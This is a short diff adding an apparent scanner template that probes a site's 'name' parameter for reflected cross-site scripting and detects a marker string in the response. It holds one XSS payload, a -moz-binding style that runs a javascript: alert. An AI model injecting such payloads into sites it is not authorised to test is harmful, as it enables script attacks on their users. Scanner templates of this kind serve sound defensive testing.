@@ -1,0 +1,20 @@
+id: xss4-033
+name: 'Raw XSS4 #32 in name'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in name'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      name:
+        - '<div style="-moz-binding:url(''javascript:alert(nx4032)'')">'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx4032'
